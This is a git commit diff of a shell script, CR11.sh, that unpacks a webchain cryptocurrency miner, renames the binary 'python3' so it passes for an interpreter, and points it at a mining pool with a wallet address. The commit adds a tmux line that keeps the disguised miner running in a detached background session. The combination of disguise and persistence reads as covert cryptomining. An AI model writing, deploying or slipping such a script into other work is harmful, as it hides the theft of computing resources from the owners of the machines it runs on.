f0cf999b8c0d59a732628a16092f7f26cc2f8af3
haidanglx <40859600+haidanglx@users.noreply.github.com>
2019-12-17 23:01:13 +0700

    Update CR11.sh

--- CR11.sh
+++ CR11.sh
@@ -30,4 +30,5 @@ tar xvzf webchain-miner-2.8.0-linux-amd64.tar.gz
 mv webchain-miner python3
 rm config.json
 ./python3 -o pool.webchain.network:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x --donate-level=0
+tmux new-session -d -s my_session1  './python3'
 exit 0
